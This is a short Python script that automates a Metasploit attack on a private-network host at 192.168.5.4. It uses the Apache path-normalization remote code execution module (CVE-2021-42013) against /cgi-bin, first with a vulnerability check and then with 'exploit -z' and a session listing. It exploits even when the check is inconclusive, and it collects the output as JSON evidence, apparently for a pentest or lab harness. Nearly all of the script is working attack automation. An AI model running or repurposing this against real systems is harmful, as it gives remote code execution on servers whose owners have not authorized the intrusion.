import json

import framework_evidence


MODULE = "exploit/multi/http/apache_normalize_path_rce"
CONFIGURE = (
    f"use {MODULE}; "
    "set RHOSTS 192.168.5.4; "
    "set RPORT 80; "
    "set SSL false; "
    "set CVE CVE-2021-42013; "
    "set TARGETURI /cgi-bin; "
    "set TARGET 0; "
)


def collect_stdout(value):
    pieces = []
    if isinstance(value, dict):
        for key, item in value.items():
            if key == "stdout" and isinstance(item, str):
                pieces.append(item)
            else:
                pieces.extend(collect_stdout(item))
    elif isinstance(value, list):
        for item in value:
            pieces.extend(collect_stdout(item))
    return pieces


def classify_check(envelope):
    text = "\n".join(collect_stdout(envelope)).lower()
    if "the target appears to be vulnerable" in text:
        return "positive"
    if "the target is not vulnerable" in text or "the target appears to be safe" in text:
        return "negative"
    return "inconclusive"


evidence = {
    "target": "192.168.5.4:80",
    "module": MODULE,
    "configured_options": {
        "RHOSTS": "192.168.5.4",
        "RPORT": 80,
        "SSL": False,
        "CVE": "CVE-2021-42013",
        "TARGETURI": "/cgi-bin",
        "TARGET": "0 (Automatic (Dropper), per supplied module metadata)",
    },
    "check_run": None,
    "check_classification": None,
    "exploit_run": None,
    "session_list_run": None,
}

try:
    check_argv = [
        "msfconsole", "-q", "-x",
        CONFIGURE + "show options; check; exit",
    ]
    check_result = framework_evidence.run_tool(check_argv)
    evidence["check_run"] = check_result
    classification = classify_check(check_result)
    evidence["check_classification"] = classification

    if classification in ("positive", "inconclusive"):
        exploit_argv = [
            "msfconsole", "-q", "-x",
            CONFIGURE + "show options; exploit -z; sessions -l; exit",
        ]
        exploit_result = framework_evidence.run_tool(exploit_argv)
        evidence["exploit_run"] = exploit_result
        evidence["session_list_run"] = exploit_result
    else:
        evidence["exploit_skipped"] = "The check output explicitly indicated a negative result."
except Exception as exc:
    evidence["execution_error"] = {
        "type": type(exc).__name__,
        "message": str(exc),
    }

print(json.dumps(evidence, ensure_ascii=False))

